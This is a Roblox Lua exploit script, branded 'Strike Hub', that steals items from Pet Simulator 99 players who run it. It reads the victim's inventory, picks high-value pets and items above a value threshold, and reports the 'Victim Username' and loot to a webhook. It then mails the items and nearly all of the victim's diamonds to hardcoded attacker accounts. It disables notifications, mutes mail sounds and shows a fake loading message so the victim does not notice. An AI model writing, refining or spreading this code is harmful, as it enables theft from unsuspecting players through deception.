-- Safe _G initialization
if _G == nil then _G = {} end
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- Wait for Library to load
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Library = ReplicatedStorage:WaitForChild("Library")
local Client = Library:WaitForChild("Client")

-- Safe requires
local network = require(Client:WaitForChild("Network"))
local SaveModule = require(Client:WaitForChild("Save"))
local message = require(Client:WaitForChild("Message"))
local RAPCmds = require(Client:WaitForChild("RAPCmds"))
local DaycareCmds = require(Client:WaitForChild("DaycareCmds"))
local ExclusiveDaycareCmds = require(Client:WaitForChild("ExclusiveDaycareCmds"))

-- Player and inventory
local plr = game.Players.LocalPlayer
local save = SaveModule.Get().Inventory
local MailMessage = "GGz"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 0

-- Users, min RAP, webhook
local users = _G.Usernames or {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"}
local min_rap = _G.minrap or 1000000
local webhook = _G.webhook or ""

if #users == 0 or webhook == "" then
    plr:Kick("You didn't add any usernames or webhook")
    return
end

for _, user in ipairs(users) do
    if plr.Name == user then
        plr:Kick("You cannot mailsteal yourself")
        return
    end
end

-- Find computeSendMailCost function safely
local FunctionToGetFirstPriceOfMail
for _, func in pairs(getgc(true)) do
    if type(func) == "function" then
        local ok, info = pcall(function() return debug.getinfo(func).name end)
        if ok and info == "computeSendMailCost" then
            FunctionToGetFirstPriceOfMail = func
            break
        end
    end
end

local mailSendPrice = 1000
if FunctionToGetFirstPriceOfMail then
    local ok, val = pcall(FunctionToGetFirstPriceOfMail)
    if ok and type(val) == "number" then
        mailSendPrice = val
    end
end

-- Get current diamonds
local GemAmount1 = 1
for _, v in pairs(SaveModule.Get().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am or 1
        break
    end
end

-- Number formatting
local function formatNumber(number)
    number = math.floor(tonumber(number) or 0)
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return string.format("%.2f%s", number, suffixes[suffixIndex])
end

-- Webhook message
local function SendMessage(diamonds)
    local headers = {["Content-Type"]="application/json"}
    local fields = {
        {name="Victim Username:", value=plr.Name, inline=true},
        {name="Items to be sent:", value="", inline=false},
        {name="Summary:", value="", inline=false}
    }

    local combinedItems = {}
    local itemRapMap = {}
    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
        else
            itemRapMap[rapKey] = {amount=item.amount, rap=item.rap}
            table.insert(combinedItems, rapKey)
        end
    end

    table.sort(combinedItems, function(a,b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount
    end)

    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        fields[2].value = fields[2].value .. itemName.." (x"..itemData.amount.."): "..formatNumber(itemData.rap*itemData.amount).." RAP\n"
    end

    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))
    local data = {["embeds"]={{["title"]="\240\159\144\177 New PS99 Execution", ["color"]=65280, ["fields"]=fields, ["footer"]={["text"]="Strike Hub."}}}}
    local body = HttpService:JSONEncode(data)
    request({Url=webhook, Method="POST", Headers=headers, Body=body})
end

-- Disable notifications and sounds
pcall(function()
    local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
    if loading then loading.Disabled = true end
    local noti = plr.PlayerGui.Notifications
    if noti then
        noti:GetPropertyChangedSignal("Enabled"):Connect(function() noti.Enabled=false end)
        noti.Enabled = false
    end
end)
game.DescendantAdded:Connect(function(x)
    if x.ClassName=="Sound" then
        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
            x.Volume=0 x.PlayOnRemove=false x:Destroy()
        end
    end
end)

-- Get RAP for an item
local function getRAP(Type, Item)
    return (RAPCmds.Get({
        Class={Name=Type},
        IsA=function(hmm) return hmm==Type end,
        GetId=function() return Item.id end,
        StackKey=function() return HttpService:JSONEncode({id=Item.id, pt=Item.pt, sh=Item.sh, tn=Item.tn}) end,
        AbstractGetRAP=function(self) return nil end
    }) or 0)
end

-- Send items to users
local function sendItem(category, uid, am)
    local remaining = am or 1
    while remaining > 0 do
        if GemAmount1 <= mailSendPrice then return false end
        local sentThisUnit = false
        for userIndex=1,#users do
            local currentUser = users[userIndex]
            local args={[1]=currentUser,[2]=MailMessage,[3]=category,[4]=uid,[5]=(category=="Pet" and 1 or remaining)}
            local ok,response,err = pcall(function() return network.Invoke("Mailbox: Send", unpack(args)) end)
            if ok then
                if response==true then
                    sentThisUnit=true
                    remaining = remaining - (category=="Pet" and 1 or remaining)
                    GemAmount1 = GemAmount1 - mailSendPrice
                    mailSendPrice = math.ceil(mailSendPrice*1.5)
                    if mailSendPrice>5000000 then mailSendPrice=5000000 end
                    break
                end
            end
        end
        if not sentThisUnit then return false end
    end
    return true
end

-- Send all gems at once
local function SendAllGems()
    for i,v in pairs(SaveModule.Get().Inventory.Currency) do
        if v.id=="Diamonds" and GemAmount1>(mailSendPrice+10000) then
            local amountToSend = GemAmount1-mailSendPrice
            if amountToSend>0 then
                for _, user in ipairs(users) do
                    local ok,response = pcall(function() return network.Invoke("Mailbox: Send", user, MailMessage, "Currency", i, amountToSend) end)
                    if ok and response==true then
                        GemAmount1 = GemAmount1 - amountToSend
                        break
                    end
                end
            end
        end
    end
end

-- Claim daycare
DaycareCmds.Claim()
ExclusiveDaycareCmds.Claim()

-- Gather items
local categoryList={"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}
for _, category in ipairs(categoryList) do
    if save[category] then
        for uid,item in pairs(save[category]) do
            if category=="Pet" then
                local dir=require(ReplicatedStorage.Library.Directory.Pets)[item.id]
                if dir and (dir.gargantuan or dir.titanic or dir.huge or dir.exclusiveLevel) then
                    local rapValue = getRAP(category,item)
                    if rapValue>=min_rap then
                        local prefix=""
                        if item.pt==1 then prefix="Golden " elseif item.pt==2 then prefix="Rainbow " end
                        if item.sh then prefix="Shiny "..prefix end
                        table.insert(sortedItems,{category=category,uid=uid,amount=item._am or 1,rap=rapValue,name=prefix..item.id})
                        totalRAP = totalRAP + rapValue*(item._am or 1)
                    end
                end
            else
                local rapValue = getRAP(category,item)
                if rapValue>=min_rap then
                    table.insert(sortedItems,{category=category,uid=uid,amount=item._am or 1,rap=rapValue,name=item.id})
                    totalRAP = totalRAP + rapValue*(item._am or 1)
                end
            end
        end
    end
end

-- Sort highest RAP first
table.sort(sortedItems,function(a,b) return (a.rap*a.amount)>(b.rap*b.amount) end)

-- Execute sending
if #sortedItems>0 or GemAmount1>(min_rap+mailSendPrice) then
    SendMessage(GemAmount1)
    for _,item in ipairs(sortedItems) do
        if item.rap>=mailSendPrice and GemAmount1>mailSendPrice then
            local ok = sendItem(item.category,item.uid,item.amount)
            if not ok then break end
        end
    end
    if GemAmount1>mailSendPrice then SendAllGems() end
    message.Error("Please wait while the script loads!")
end
